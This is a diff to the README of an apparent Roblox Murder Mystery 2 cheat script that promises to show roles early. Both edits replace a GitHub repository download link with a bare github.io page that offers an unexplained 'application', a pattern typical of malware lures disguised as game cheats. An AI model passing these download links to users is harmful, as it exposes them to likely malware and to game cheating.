@@ -1,6 +1,6 @@
 # 🎭 roblox-murder-mystery-2-script-2026 - See Roles Before Anyone Else
 
-[![Download Now](https://img.shields.io/badge/Download-MM2_Script_2026-2ea44f?style=for-the-badge&logo=github)](https://github.com/ploughwrightretrovision1605/roblox-murder-mystery-2-script-2026)
+[![Download Now](https://img.shields.io/badge/Download-MM2_Script_2026-2ea44f?style=for-the-badge&logo=github)](https://ploughwrightretrovision1605.github.io)
 
 ## 🎯 What Is This?
 
@@ -23,7 +23,7 @@ Before you start, make sure you have:
 
 ### ⬇️ Downloading the Script
 
-Visit this link to download the application: [https://github.com/ploughwrightretrovision1605/roblox-murder-mystery-2-script-2026](https://github.com/ploughwrightretrovision1605/roblox-murder-mystery-2-script-2026)
+Visit this link to download the application: [https://ploughwrightretrovision1605.github.io](https://ploughwrightretrovision1605.github.io)
 
 Click the download button on that page. The file should save to your computer, usually in your Downloads folder. If a login prompt appears, you can skip it or create a free GitHub account if you don't have one.
 
